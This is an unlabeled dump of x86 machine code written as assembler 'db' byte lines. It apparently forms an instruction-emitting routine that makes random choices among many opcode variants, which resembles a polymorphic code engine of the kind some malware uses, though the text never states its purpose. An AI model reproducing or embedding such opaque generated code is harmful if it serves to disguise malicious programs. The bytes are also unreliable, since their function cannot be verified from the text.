	db	0EBh,005h,0B8h,0FDh,0FFh,0FFh,0FFh,08Bh
	db	065h,0FCh,08Bh,06Dh,0F8h,0EBh,0BFh,0F7h
	db	045h,058h,001h,000h,000h,000h,074h,005h
	db	050h,0B0h,0CCh,0AAh,058h,0C3h,0E3h,047h
	db	083h,085h,0D8h,0FEh,0FFh,0FFh,004h,049h
	db	00Fh,0B6h,045h,0C4h,060h,08Dh,075h,0C5h
	db	08Dh,07Dh,0C4h,0A5h,0A5h,061h,0F7h,045h
	db	058h,000h,010h,000h,000h,075h,00Bh,0E3h
	db	009h,060h,08Dh,07Dh,0C4h,0F2h,0AEh,061h
	db	074h,004h,00Fh,0B3h,045h,0F0h,0E8h,0BFh
	db	004h,000h,000h,050h,004h,050h,0AAh,058h
	db	0FFh,075h,0F0h,00Fh,0ABh,045h,0F0h,0E8h
	db	001h,005h,000h,000h,08Fh,045h,0F0h,0C3h
	db	0E3h,007h,0E8h,0AFh,0FFh,0FFh,0FFh,0EBh
	db	0F7h,0C3h,00Fh,0A3h,05Dh,0F0h,073h,007h
	db	0E8h,0A1h,0FFh,0FFh,0FFh,0EBh,0F3h,0C3h
	db	0E8h,032h,002h,000h,000h,083h,07Dh,0F0h
	db	000h,00Fh,085h,065h,0FFh,0FFh,0FFh,0F7h
	db	045h,058h,000h,040h,000h,000h,074h,00Ah
	db	0E8h,0E7h,001h,000h,000h,0E9h,096h,001h
	db	000h,000h,0E8h,018h,004h,000h,000h,00Fh
	db	082h,047h,0FFh,0FFh,0FFh,091h,00Fh,0B3h
	db	04Dh,04Ch,00Fh,0B3h,04Dh,0ECh,0E8h,057h
	db	004h,000h,000h,066h,0B8h,089h,0E0h,002h
	db	0E1h,066h,0ABh,0E8h,0EFh,001h,000h,000h
	db	0E8h,0F2h,003h,000h,000h,073h,019h,083h
	db	07Dh,030h,000h,074h,011h,0E8h,038h,004h
	db	000h,000h,066h,0B8h,081h,0C0h,002h,0E1h
	db	066h,0ABh,08Bh,045h,030h,0ABh,0EBh,03Dh
	db	093h,00Fh,0ABh,05Dh,0F0h,08Bh,055h,030h
	db	0E8h,0D7h,001h,000h,000h,0E8h,0BDh,001h
	db	000h,000h,0E8h,0D2h,012h,000h,000h,074h
	db	00Eh,00Fh,0ABh,04Dh,04Ch,00Fh,0B3h,05Dh
	db	04Ch,00Fh,0B3h,05Dh,0ECh,087h,0CBh,00Fh
	db	0B3h,05Dh,0F0h,0E8h,0FAh,003h,000h,000h
	db	066h,0B8h,001h,0C0h,00Ah,0E1h,0C0h,0E3h
	db	003h,00Ah,0E3h,066h,0ABh,0E8h,08Dh,001h
	db	000h,000h,08Bh,045h,020h,00Bh,0C0h,074h
	db	00Fh,083h,03Ch,088h,0FFh,074h,009h,0F7h
	db	045h,058h,000h,001h,000h,000h,075h,010h
	db	0F7h,045h,058h,000h,001h,000h,000h,075h
	db	042h,0E8h,083h,012h,000h,000h,074h,03Bh
	db	08Dh,041h,050h,0AAh,00Fh,0ABh,04Dh,04Ch
	db	00Fh,0B3h,04Dh,0F0h,0E8h,056h,001h,000h
	db	000h,0E8h,01Eh,001h,000h,000h,0E8h,0A7h
	db	003h,000h,000h,0F7h,045h,058h,000h,001h
	db	000h,000h,075h,005h,0B0h,0C3h,0AAh,0EBh
	db	037h,066h,0B8h,0FFh,014h,066h,0ABh,0B0h
	db	024h,0AAh,083h,085h,0D8h,0FEh,0FFh,0FFh
	db	004h,0EBh,025h,0E8h,0F4h,000h,000h,000h
	db	0E8h,07Dh,003h,000h,000h,066h,0B8h,0FFh
	db	0E0h,0F7h,045h,058h,000h,001h,000h,000h
	db	074h,002h,0B4h,0D0h,002h,0E1h,066h,0ABh
	db	00Fh,0ABh,04Dh,04Ch,00Fh,0B3h,04Dh,0F0h
	db	0C7h,045h,0ECh,000h,000h,000h,000h,0C7h
	db	045h,0F0h,000h,000h,000h,000h,0E8h,0F4h
	db	000h,000h,000h,0F7h,045h,058h,000h,001h
	db	000h,000h,074h,06Ch,0E8h,041h,003h,000h
	db	000h,066h,0B8h,081h,0C4h,066h,0ABh,08Bh
	db	085h,0D8h,0FEh,0FFh,0FFh,0ABh,0E8h,0D4h
	db	000h,000h,000h,08Bh,05Dh,014h,00Fh,0BDh
	db	0C3h,074h,01Ah,00Fh,0B3h,0C3h,0E8h,01Fh
	db	003h,000h,000h,00Fh,0B3h,045h,04Ch,00Fh
	db	0B3h,045h,0ECh,004h,058h,0AAh,0E8h,062h
	db	003h,000h,000h,0EBh,0E1h,0E8h,008h,003h
	db	000h,000h,0F7h,045h,058h,000h,002h,000h
	db	000h,075h,013h,0F7h,045h,058h,000h,004h
	db	000h,000h,075h,022h,0E8h,0F1h,002h,000h
	db	000h,0B0h,0C3h,0AAh,0EBh,012h,0B0h,0E9h
	db	0AAh,08Dh,047h,004h,02Bh,045h,034h,003h
	db	045h,01Ch,02Bh,045h,018h,0F7h,0D8h,0ABh
	db	0E8h,07Ah,000h,000h,000h,0C3h,0C7h,045h
	db	04Ch,001h,000h,000h,000h,0C7h,045h,0ECh
	db	000h,000h,000h,000h,0C7h,045h,0F0h,000h
	db	000h,000h,000h,0E8h,00Dh,003h,000h,000h
	db	033h,0C0h,0E8h,08Dh,001h,000h,000h,033h
	db	0DBh,0BAh,001h,000h,000h,000h,0E8h,061h
	db	000h,000h,000h,00Fh,0ABh,045h,0F0h,0E8h
	db	0F1h,002h,000h,000h,0E8h,099h,002h,000h
	db	000h,0B0h,0C2h,0AAh,066h,0B8h,00Ch,000h
	db	066h,0ABh,0EBh,0B4h,083h,07Dh,020h,000h
	db	074h,027h,033h,0DBh,00Fh,0A3h,05Dh,04Ch
	db	073h,019h,08Bh,055h,020h,08Bh,014h,09Ah
	db	083h,0FAh,0FFh,074h,00Eh,0E8h,02Ah,000h
	db	000h,000h,00Fh,0ABh,05Dh,0F0h,0E8h,0BAh
	db	002h,000h,000h,043h,080h,0FBh,008h,072h
	db	0DBh,0E8h,059h,0FDh,0FFh,0FFh,0C3h,0B8h
	db	00Ah,000h,000h,000h,0E8h,0F9h,010h,000h
	db	000h,074h,008h,0E8h,09Dh,002h,000h,000h
	db	048h,075h,0F8h,0C3h,0F7h,045h,054h,09Ch
	db	001h,000h,000h,074h,022h,0B8h,005h,000h
	db	000h,000h,0E8h,0DBh,010h,000h,000h,074h
	db	03Dh,048h,074h,022h,048h,074h,072h,048h
	db	00Fh,084h,0A0h,000h,000h,000h,0F7h,045h
	db	054h,010h,000h,000h,000h,074h,0DEh,033h
	db	054h,09Dh,0CCh,031h,054h,09Dh,0CCh,0B8h
	db	081h,0F0h,035h,000h,0EBh,030h,0F7h,045h
	db	054h,004h,000h,000h,000h,074h,0C6h,02Bh
	db	054h,09Dh,0CCh,001h,054h,09Dh,0CCh,0B8h
	db	081h,0C0h,005h,000h,0EBh,018h,0F7h,045h
	db	054h,008h,000h,000h,000h,074h,0AEh,02Bh
	db	054h,09Dh,0CCh,0F7h,0DAh,029h,054h,09Dh
	db	0CCh,0B8h,081h,0E8h,02Dh,000h,00Bh,0D2h
	db	074h,01Eh,0E8h,0D3h,001h,000h,000h,0F7h
	db	045h,058h,010h,000h,000h,000h,075h,00Ah
	db	00Bh,0DBh,075h,006h,0C1h,0E8h,010h,0AAh
	db	0EBh,004h,002h,0E3h,066h,0ABh,092h,0ABh
	db	0C3h,0F7h,045h,054h,000h,001h,000h,000h
	db	00Fh,084h,06Fh,0FFh,0FFh,0FFh,08Bh,044h
	db	09Dh,0CCh,023h,0C2h,03Bh,0C2h,075h,087h
	db	0E8h,077h,010h,000h,000h,0F7h,054h,09Dh
	db	0CCh,023h,044h,09Dh,0CCh,0F7h,054h,09Dh
	db	0CCh,033h,0D0h,021h,054h,09Dh,0CCh,0B8h
	db	081h,0E0h,025h,000h,0EBh,0ACh,0F7h,045h
	db	054h,080h,000h,000h,000h,00Fh,084h,03Ah
	db	0FFh,0FFh,0FFh,08Bh,0C2h,023h,044h,09Dh
	db	0CCh,03Bh,044h,09Dh,0CCh,00Fh,085h,04Ch
	db	0FFh,0FFh,0FFh,0E8h,03Ch,010h,000h,000h
	db	023h,044h,09Dh,0CCh,033h,0D0h,009h,054h
	db	09Dh,0CCh,0B8h,081h,0C8h,00Dh,000h,0E9h
	db	072h,0FFh,0FFh,0FFh,083h,07Dh,04Ch,000h
	db	074h,00Dh,0E8h,00Ah,010h,000h,000h,00Fh
	db	0A3h,045h,04Ch,073h,0EFh,0F8h,0C3h,0B8h
	db	0FFh,0FFh,0FFh,0FFh,0F9h,0C3h,0E8h,0E1h
	db	0FFh,0FFh,0FFh,072h,006h,0E8h,002h,000h
	db	000h,000h,0F8h,0C3h,00Fh,0ABh,045h,0ECh
	db	072h,023h,053h,08Bh,0D8h,0E8h,018h,001h
	db	000h,000h,0E8h,0C2h,00Fh,000h,000h,074h
	db	015h,048h,074h,033h,0B0h,0B8h,00Ah,0C3h
	db	0AAh,0E8h,0DEh,00Fh,000h,000h,089h,044h
	db	09Dh,0CCh,0ABh,093h,05Bh,0C3h,0F7h,045h
	db	054h,000h,000h,000h,080h,074h,0E5h,0B0h
	db	068h,0AAh,0E8h,0C5h,00Fh,000h,000h,089h
	db	044h,09Dh,0CCh,0ABh,0E8h,0E1h,000h,000h
	db	000h,08Dh,043h,058h,0AAh,0EBh,0DCh,0F7h
	db	045h,054h,010h,000h,000h,000h,074h,009h
	db	0B0h,031h,0E8h,08Ah,00Fh,000h,000h,074h
	db	00Bh,0F7h,045h,054h,008h,000h,000h,000h
	db	074h,0B2h,0B0h,029h,0F7h,045h,058h,040h
	db	000h,000h,000h,075h,009h,0E8h,06Fh,00Fh
	db	000h,000h,074h,002h,034h,002h,0AAh,08Ah
	db	0C3h,0C0h,0E0h,003h,00Ah,0C3h,00Ch,0C0h
	db	0AAh,0C7h,044h,09Dh,0CCh,000h,000h,000h
	db	000h,0E8h,007h,000h,000h,000h,0E8h,002h
	db	000h,000h,000h,0EBh,08Eh,0E8h,047h,00Fh
	db	000h,000h,074h,032h,0E8h,081h,000h,000h
	db	000h,0E8h,03Bh,00Fh,000h,000h,074h,014h
	db	0F7h,045h,054h,020h,000h,000h,000h,074h
	db	01Dh,0FFh,044h,09Dh,0CCh,0B0h,040h,00Ah
	db	0C3h,0AAh,0EBh,012h,0F7h,045h,054h,040h
	db	000h,000h,000h,074h,009h,0FFh,04Ch,09Dh
	db	0CCh,0B0h,048h,00Ah,0C3h,0AAh,0C3h,08Bh
	db	045h,0F0h,023h,045h,04Ch,03Bh,045h,04Ch
	db	074h,00Eh,0E8h,00Fh,0FFh,0FFh,0FFh,072h
	db	007h,00Fh,0A3h,045h,0F0h,072h,0E8h,0C3h
	db	0B8h,0FFh,0FFh,0FFh,0FFh,0F9h,0C3h,0BAh
	db	010h,027h,000h,000h,04Ah,00Fh,084h,010h
	db	0FBh,0FFh,0FFh,08Bh,045h,038h,02Dh,080h
	db	000h,000h,000h,0E8h,0C2h,00Eh,000h,000h
	db	083h,0C0h,040h,003h,045h,034h,097h,0B9h
	db	03Ch,000h,000h,000h,08Bh,045h,03Ch,0F3h
	db	0AEh,075h,0D9h,083h,0EFh,028h,0C3h,060h
	db	0EBh,02Fh,060h,08Bh,045h,034h,003h,045h
	db	038h,02Bh,0C7h,083h,0F8h,040h,072h,021h
	db	08Bh,045h,03Ch,0B9h,028h,000h,000h,000h
	db	057h,0F3h,0AEh,05Fh,075h,013h,0F7h,045h
	db	058h,004h,000h,000h,000h,075h,029h,08Bh
	db	045h,048h,0E8h,07Bh,00Eh,000h,000h,075h
	db	01Fh,0F7h,045h,058h,004h,000h,000h,000h
	db	00Fh,085h,0ADh,0FAh,0FFh,0FFh,0B0h,0E9h
	db	0AAh,0ABh,08Bh,0DFh,0E8h,086h,0FFh,0FFh
	db	0FFh,08Bh,0C7h,02Bh,0C3h,089h,043h,0FCh
	db	089h,03Ch,024h,061h,0C3h,060h,0F7h,045h
	db	058h,002h,000h,000h,000h,00Fh,085h,0CCh
	db	001h,000h,000h,08Bh,045h,054h,00Bh,045h
	db	050h,00Fh,084h,0C0h,001h,000h,000h,08Bh
	db	045h,0F0h,03Bh,045h,04Ch,00Fh,084h,0B4h
	db	001h,000h,000h,0E8h,082h,0FFh,0FFh,0FFh
	db	0E8h,02Ah,0FFh,0FFh,0FFh,093h,00Fh,082h
	db	0A3h,001h,000h,000h,0E8h,03Dh,0FEh,0FFh
	db	0FFh,092h,00Fh,082h,097h,001h,000h,000h
	db	0E8h,03Fh,00Eh,000h,000h,091h,0B8h,037h
	db	000h,000h,000h,0E8h,002h,00Eh,000h,000h
	db	00Bh,0C0h,00Fh,084h,0A9h,006h,000h,000h
	db	048h,00Fh,084h,0BCh,006h,000h,000h,048h
	db	00Fh,084h,0CFh,006h,000h,000h,048h,00Fh
	db	084h,0E0h,006h,000h,000h,048h,00Fh,084h
	db	0C1h,006h,000h,000h,048h,00Fh,084h,0D2h
	db	006h,000h,000h,048h,00Fh,084h,0E3h,006h
	db	000h,000h,048h,00Fh,084h,0F6h,006h,000h
	db	000h,048h,00Fh,084h,009h,007h,000h,000h
	db	048h,00Fh,084h,01Ch,007h,000h,000h,048h
	db	00Fh,084h,02Fh,007h,000h,000h,048h,00Fh
	db	084h,014h,008h,000h,000h,048h,00Fh,084h
	db	025h,008h,000h,000h,048h,00Fh,084h,03Eh
	db	008h,000h,000h,048h,00Fh,084h,0FFh,007h
	db	000h,000h,048h,00Fh,084h,010h,008h,000h
	db	000h,048h,00Fh,084h,029h,008h,000h,000h
	db	048h,00Fh,084h,042h,008h,000h,000h,048h
	db	00Fh,084h,05Bh,008h,000h,000h,048h,00Fh
	db	084h,074h,008h,000h,000h,048h,00Fh,084h
	db	0A3h,008h,000h,000h,048h,00Fh,084h,0BBh
	db	008h,000h,000h,048h,00Fh,084h,011h,007h
	db	000h,000h,048h,00Fh,084h,026h,007h,000h
	db	000h,048h,00Fh,084h,0E7h,006h,000h,000h
	db	048h,00Fh,084h,0BEh,008h,000h,000h,048h
	db	00Fh,084h,0DCh,008h,000h,000h,048h,00Fh
	db	084h,03Eh,009h,000h,000h,048h,00Fh,084h
	db	058h,009h,000h,000h,048h,00Fh,084h,072h
	db	009h,000h,000h,048h,00Fh,084h,08Ch,009h
	db	000h,000h,048h,00Fh,084h,020h,003h,000h
	db	000h,048h,00Fh,084h,068h,003h,000h,000h
	db	048h,00Fh,084h,078h,003h,000h,000h,048h
	db	00Fh,084h,048h,00Ah,000h,000h,048h,00Fh
	db	084h,063h,00Ah,000h,000h,048h,00Fh,084h
	db	07Eh,00Ah,000h,000h,048h,00Fh,084h,0AAh
	db	00Ah,000h,000h,048h,00Fh,084h,00Dh,00Bh
	db	000h,000h,048h,00Fh,084h,092h,003h,000h
	db	000h,048h,00Fh,084h,0AEh,003h,000h,000h
	db	048h,00Fh,084h,026h,001h,000h,000h,048h
	db	00Fh,084h,0ACh,001h,000h,000h,048h,00Fh
	db	084h,084h,009h,000h,000h,048h,00Fh,084h
	db	0A4h,009h,000h,000h,03Bh,0DAh,00Fh,084h
	db	094h,0FEh,0FFh,0FFh,048h,00Fh,084h,0BCh
	db	006h,000h,000h,048h,00Fh,084h,099h,006h
	db	000h,000h,048h,00Fh,084h,0D8h,006h,000h
	db	000h,048h,00Fh,084h,0EDh,006h,000h,000h
	db	048h,00Fh,084h,054h,008h,000h,000h,048h
	db	00Fh,084h,071h,008h,000h,000h,048h,00Fh
	db	084h,011h,009h,000h,000h,048h,00Fh,084h
	db	0D4h,003h,000h,000h,048h,00Fh,084h,0AAh
	db	003h,000h,000h,048h,074h,006h,0CCh,089h
	db	03Ch,024h,061h,0C3h,0F7h,045h,050h,080h
	db	000h,000h,000h,00Fh,084h,03Fh,0FEh,0FFh
	db	0FFh,0FFh,075h,054h,0FFh,075h,050h,081h
	db	065h,054h,0FFh,0FFh,0FFh,09Fh,081h,065h
	db	050h,003h,0FFh,0FFh,0FFh,00Fh,0ABh,05Dh
	db	0F0h,057h,0E8h,0A3h,0FDh,0FFh,0FFh,0E8h
	db	043h,0FBh,0FFh,0FFh,0E8h,058h,00Ch,000h
	db	000h,074h,00Dh,066h,0B8h,081h,0C0h,00Ah
	db	0E3h,066h,0ABh,08Bh,0C1h,0ABh,0EBh,00Dh
	db	066h,0B8h,081h,0E8h,00Ah,0E3h,066h,0ABh
	db	08Bh,0C1h,0ABh,0F7h,0D9h,0B8h,028h,004h
	db	001h,000h,0E8h,01Bh,00Ch,000h,000h,040h
	db	001h,04Ch,09Dh,0CCh,048h,075h,0F9h,0E8h
	db	066h,0FDh,0FFh,0FFh,0E8h,006h,0FBh,0FFh
	db	0FFh,066h,0B8h,081h,0F8h,00Ah,0E3h,066h
	db	0ABh,08Bh,044h,09Dh,0CCh,0ABh,0E8h,04Fh
	db	0FDh,0FFh,0FFh,059h,08Dh,047h,002h,02Bh
	db	0C1h,0F7h,0D8h,083h,0F8h,07Fh,07Fh,014h
	db	083h,0F8h,080h,07Ch,00Fh,0E8h,0F7h,00Bh
	db	000h,000h,074h,008h,08Ah,0E0h,0B0h,075h
	db	066h,0ABh,0EBh,00Ch,066h,0B8h,00Fh,085h
	db	066h,0ABh,0ABh,02Bh,0CFh,089h,04Fh,0FCh
	db	08Fh,045h,050h,08Fh,045h,054h,08Bh,045h
	db	0F0h,021h,045h,0ECh,00Fh,0B3h,05Dh,0F0h
	db	0E9h,03Ah,0FFh,0FFh,0FFh,0F7h,045h,050h
	db	040h,000h,000h,000h,00Fh,084h,07Eh,0FDh
	db	0FFh,0FFh,083h,07Dh,0B4h,000h,00Fh,084h
	db	023h,0FFh,0FFh,0FFh,080h,07Dh,0BCh,000h
	db	00Fh,085h,019h,0FFh,0FFh,0FFh,08Bh,045h
	db	0B4h,0E8h,08Ch,00Bh,000h,000h,096h,08Bh
	db	09Ch,0B5h,034h,0FFh,0FFh,0FFh,00Fh,0B6h
	db	08Ch,035h,014h,0FFh,0FFh,0FFh,0E3h,00Fh
	db	0E8h,0CDh,0FCh,0FFh,0FFh,0E8h,08Fh,00Bh
	db	000h,000h,004h,050h,0AAh,0E2h,0F1h,0E8h
	db	0BEh,0FCh,0FFh,0FFh,0B0h,0E8h,0AAh,0ABh
	db	02Bh,0DFh,089h,05Fh,0FCh,00Fh,0B6h,08Ch
	db	035h,0F4h,0FEh,0FFh,0FFh,0E3h,026h,00Fh
	db	0B6h,08Ch,035h,014h,0FFh,0FFh,0FFh,0E3h
	db	01Ch,066h,0B8h,083h,0C4h,066h,0ABh,08Dh
	db	004h,08Dh,000h,000h,000h,000h,0AAh,0E8h
	db	04Dh,00Bh,000h,000h,074h,007h,0C6h,047h
	db	0FEh,0ECh,0F6h,05Fh,0FFh,0E9h,0ADh,0FEh
	db	0FFh,0FFh,0F7h,045h,050h,040h,000h,000h
	db	000h,00Fh,084h,0F1h,0FCh,0FFh,0FFh,083h
	db	07Dh,0B4h,020h,00Fh,083h,096h,0FEh,0FFh
	db	0FFh,0FEh,045h,0BCh,0F7h,045h,058h,004h
	db	000h,000h,000h,075h,008h,057h,0E8h,054h
	db	0FCh,0FFh,0FFh,0EBh,005h,0B0h,0E9h,0AAh
	db	0ABh,057h,0E8h,0C8h,000h,000h,000h,033h
	db	0C9h,0E8h,003h,00Bh,000h,000h,075h,00Dh
	db	0B8h,004h,000h,000h,000h,0E8h,0E0h,00Ah
	db	000h,000h,08Dh,048h,001h,08Bh,045h,0B4h
	db	0FFh,045h,0B4h,089h,0BCh,085h,034h,0FFh
	db	0FFh,0FFh,088h,08Ch,005h,014h,0FFh,0FFh
	db	0FFh,0E8h,0DBh,00Ah,000h,000h,00Fh,094h
	db	0C2h,088h,094h,005h,0F4h,0FEh,0FFh,0FFh
	db	0FEh,0CAh,022h,0CAh,0C1h,0E1h,002h,051h
	db	0E8h,0D4h,00Ah,000h,000h,023h,045h,04Ch
	db	074h,0F6h,089h,045h,04Ch,0C7h,045h,0ECh
	db	000h,000h,000h,000h,0C7h,045h,0F0h,000h
	db	000h,000h,000h,08Bh,05Dh,04Ch,00Fh,0BCh
	db	0C3h,074h,00Dh,00Fh,0B3h,0C3h,0E8h,0DFh
	db	0FBh,0FFh,0FFh,004h,050h,0AAh,0EBh,0EEh
	db	0B8h,032h,000h,000h,000h,0E8h,07Ah,0F9h
	db	0FFh,0FFh,0E8h,0CBh,0FBh,0FFh,0FFh,08Bh
	db	05Dh,04Ch,00Fh,0BDh,0C3h,074h,00Dh,00Fh
	db	0B3h,0C3h,0E8h,0BBh,0FBh,0FFh,0FFh,004h
	db	058h,0AAh,0EBh,0EEh,0E8h,0B1h,0FBh,0FFh
	db	0FFh,0B0h,0C3h,0AAh,059h,0E3h,007h,0FEh
	db	04Fh,0FFh,08Bh,0C1h,066h,0ABh,0E8h,031h
	db	000h,000h,000h,0F7h,045h,058h,004h,000h
	db	000h,000h,075h,003h,05Fh,0EBh,008h,059h
	db	08Bh,0C7h,02Bh,0C1h,089h,041h,0FCh,0FEh
	db	04Dh,0BCh,0E9h,0B0h,0FDh,0FFh,0FFh,05Eh
	db	0FFh,075h,04Ch,08Dh,045h,0C0h,08Dh,04Dh
	db	0F4h,0FFh,030h,083h,0C0h,004h,03Bh,0C1h
	db	075h,0F7h,0FFh,0E6h,05Eh,08Dh,045h,0C0h
	db	08Dh,04Dh,0F4h,083h,0E9h,004h,08Fh,001h
	db	03Bh,0C8h,075h,0F7h,08Fh,045h,04Ch,0FFh
	db	0E6h,0F7h,045h,054h,000h,000h,000h,001h
	db	00Fh,084h,0CAh,0FBh,0FFh,0FFh,083h,0FAh
	db	004h,00Fh,083h,070h,0FDh,0FFh,0FFh,08Bh
	db	04Ch,095h,0CCh,0E8h,0F9h,009h,000h,000h
	db	074h,005h,08Ah,0CDh,080h,0CAh,004h,0E8h
	db	0EDh,009h,000h,000h,074h,009h,066h,0B8h
	db	00Fh,0B6h,00Fh,0B6h,0C9h,0EBh,007h,066h
	db	0B8h,00Fh,0BEh,00Fh,0BEh,0C9h,089h,04Ch
	db	09Dh,0CCh,066h,0ABh,087h,0DAh,0E8h,0FBh
	db	001h,000h,000h,0E9h,037h,0FDh,0FFh,0FFh
	db	0F7h,045h,050h,001h,000h,000h,000h,00Fh
	db	084h,07Bh,0FBh,0FFh,0FFh,08Bh,04Ch,095h
	db	0CCh,08Dh,042h,050h,0AAh,0EBh,025h,0F7h
	db	045h,050h,002h,000h,000h,000h,00Fh,084h
	db	064h,0FBh,0FFh,0FFh,0E8h,0A0h,009h,000h
	db	000h,074h,00Bh,08Ah,0E1h,00Fh,0BEh,0CCh
	db	0B0h,06Ah,066h,0ABh,0EBh,006h,0B0h,068h
	db	0AAh,08Bh,0C1h,0ABh,00Fh,0ABh,05Dh,0F0h
	db	0E8h,018h,0FBh,0FFh,0FFh,00Fh,0B3h,05Dh
	db	0F0h,0E8h,0BCh,0FAh,0FFh,0FFh,08Dh,043h
	db	058h,0AAh,089h,04Ch,09Dh,0CCh,0E9h,0DCh
	db	0FCh,0FFh,0FFh,0F7h,045h,058h,004h,000h
	db	000h,000h,00Fh,085h,0CFh,0FCh,0FFh,0FFh
	db	0F7h,045h,050h,004h,000h,000h,000h,00Fh
	db	084h,0C2h,0FCh,0FFh,0FFh,0C7h,045h,0B8h
	db	0FFh,0FFh,0FFh,0FFh,0EBh,014h,0F7h,045h
	db	050h,008h,000h,000h,000h,00Fh,084h,0ACh
	db	0FCh,0FFh,0FFh,0C7h,045h,0B8h,000h,000h
	db	000h,000h,085h,0DBh,075h,00Eh,0F7h,045h
	db	058h,010h,000h,000h,000h,075h,005h,0B0h
	db	03Dh,0AAh,0EBh,008h,066h,0B8h,081h,0F8h
	db	00Ah,0E3h,066h,0ABh,0E8h,018h,009h,000h
	db	000h,08Bh,044h,09Dh,0CCh,074h,023h,08Bh
	db	0C1h,0F7h,045h,058h,020h,000h,000h,000h
	db	075h,018h,0E8h,002h,009h,000h,000h,075h
	db	011h,04Fh,080h,03Fh,03Dh,074h,0D5h,047h
	db	0C6h,047h,0FEh,083h,00Fh,0BEh,0C0h,0AAh
	db	0EBh,04Fh,0ABh,0EBh,04Ch,0F7h,045h,058h
	db	004h,000h,000h,000h,00Fh,085h,04Dh,0FCh
	db	0FFh,0FFh,0F7h,045h,050h,010h,000h,000h
	db	000h,00Fh,084h,040h,0FCh,0FFh,0FFh,0C7h
	db	045h,0B8h,0FFh,0FFh,0FFh,0FFh,0EBh,014h
	db	0F7h,045h,050h,020h,000h,000h,000h,00Fh
	db	084h,02Ah,0FCh,0FFh,0FFh,0C7h,045h,0B8h
	db	000h,000h,000h,000h,053h,052h,0B0h,039h
	db	0E8h,09Eh,000h,000h,000h,0AAh,0E8h,0D3h
	db	000h,000h,000h,05Ah,05Bh,08Bh,044h,095h
	db	0CCh,0E8h,0DCh,0F9h,0FFh,0FFh,039h,044h
	db	09Dh,0CCh,00Fh,090h,085h,0E4h,0FEh,0FFh
	db	0FFh,00Fh,092h,085h,0E6h,0FEh,0FFh,0FFh
	db	00Fh,094h,085h,0E8h,0FEh,0FFh,0FFh,00Fh
	db	096h,085h,0EAh,0FEh,0FFh,0FFh,00Fh,098h
	db	085h,0ECh,0FEh,0FFh,0FFh,00Fh,09Ah,085h
	db	0EEh,0FEh,0FFh,0FFh,00Fh,09Ch,085h,0F0h
	db	0FEh,0FFh,0FFh,00Fh,09Eh,085h,0F2h,0FEh
	db	0FFh,0FFh,0E8h,062h,008h,000h,000h,0D1h
	db	0E0h,032h,084h,005h,0E4h,0FEh,0FFh,0FFh
	db	034h,070h,08Bh,04Dh,0B8h,0E3h,016h,034h
	db	0F1h,0B4h,00Fh,086h,0C4h,08Bh,0DFh,047h
	db	0E8h,07Ah,0F9h,0FFh,0FFh,066h,089h,003h
	db	0E9h,0A2h,0FBh,0FFh,0FFh,0E8h,02Fh,008h
	db	000h,000h,074h,00Ch,0AAh,0E8h,037h,008h
	db	000h,000h,0AAh,0E9h,08Fh,0FBh,0FFh,0FFh
	db	034h,0F0h,0B4h,00Fh,086h,0C4h,066h,0ABh
	db	0E8h,02Fh,008h,000h,000h,0ABh,0E9h,07Ch
	db	0FBh,0FFh,0FFh,0F7h,045h,058h,040h,000h
	db	000h,000h,075h,00Bh,0E8h,000h,008h,000h
	db	000h,074h,004h,034h,002h,087h,0DAh,0C3h
	db	00Ah,0C3h,0AAh,0E9h,05Fh,0FBh,0FFh,0FFh
	db	00Ah,0E3h,066h,0ABh,0E9h,056h,0FBh,0FFh
	db	0FFh,0E8h,0D5h,0FFh,0FFh,0FFh,0EBh,003h
	db	0AAh,08Ah,0C4h,0AAh,0E8h,005h,000h,000h
	db	000h,0E9h,041h,0FBh,0FFh,0FFh,060h,0B0h
	db	0C0h,0C0h,0E2h,003h,00Ah,0C2h,00Ah,0C3h
	db	0AAh,061h,047h,0C3h,066h,0ABh,0E8h,0EBh
	db	0FFh,0FFh,0FFh,0EBh,032h,0AAh,0E8h,0E3h
	db	0FFh,0FFh,0FFh,0EBh,003h,00Ah,0C3h,0AAh
	db	091h,0ABh,0E9h,018h,0FBh,0FFh,0FFh,00Ah
	db	0E3h,066h,0ABh,0EBh,0F3h,03Ch,083h,074h
	db	012h,0F7h,045h,058h,010h,000h,000h,000h
	db	075h,0EDh,085h,0DBh,075h,0E9h,0C1h,0E8h
	db	010h,0EBh,0DCh,00Ah,0E3h,066h,0ABh,08Ah
	db	0C1h,0AAh,0E9h,0F0h,0FAh,0FFh,0FFh,083h
	db	0E1h,01Fh,080h,0F9h,001h,080h,0D1h,000h
	db	0C3h,066h,0ABh,0C1h,0E8h,010h,00Ah,0C3h
	db	08Ah,0E1h,066h,0ABh,0E9h,0D6h,0FAh,0FFh
	db	0FFh,0F7h,045h,054h,000h,040h,000h,000h
	db	00Fh,084h,01Ah,0F9h,0FFh,0FFh,0F7h,054h
	db	09Dh,0CCh,066h,0B8h,0F7h,0D0h,0E9h,05Dh
	db	0FFh,0FFh,0FFh,0F7h,045h,054h,000h,080h
	db	000h,000h,00Fh,084h,000h,0F9h,0FFh,0FFh
	db	0F7h,05Ch,09Dh,0CCh,066h,0B8h,0F7h,0D8h
	db	0E9h,043h,0FFh,0FFh,0FFh,0F7h,045h,054h
	db	020h,000h,000h,000h,00Fh,084h,0E6h,0F8h
	db	0FFh,0FFh,0FFh,044h,09Dh,0CCh,0B0h,040h
	db	0E9h,023h,0FFh,0FFh,0FFh,0F7h,045h,054h
	db	040h,000h,000h,000h,00Fh,084h,0CEh,0F8h
	db	0FFh,0FFh,0FFh,04Ch,09Dh,0CCh,0B0h,048h
	db	0E9h,00Bh,0FFh,0FFh,0FFh,0F7h,045h,054h
	db	000h,002h,000h,000h,00Fh,084h,0B6h,0F8h
	db	0FFh,0FFh,0D1h,064h,09Dh,0CCh,066h,0B8h
	db	0D1h,0E0h,0E9h,0F9h,0FEh,0FFh,0FFh,0F7h
	db	045h,054h,000h,004h,000h,000h,00Fh,084h
	db	09Ch,0F8h,0FFh,0FFh,0D1h,06Ch,09Dh,0CCh
	db	066h,0B8h,0D1h,0E8h,0E9h,0DFh,0FEh,0FFh
	db	0FFh,0F7h,045h,054h,000h,008h,000h,000h
	db	00Fh,084h,082h,0F8h,0FFh,0FFh,0D1h,044h
	db	09Dh,0CCh,066h,0B8h,0D1h,0C0h,0E9h,0C5h
	db	0FEh,0FFh,0FFh,0F7h,045h,054h,000h,010h
	db	000h,000h,00Fh,084h,068h,0F8h,0FFh,0FFh
	db	0D1h,04Ch,09Dh,0CCh,066h,0B8h,0D1h,0C8h
	db	0E9h,0ABh,0FEh,0FFh,0FFh,0F7h,045h,054h
	db	000h,020h,000h,000h,00Fh,084h,04Eh,0F8h
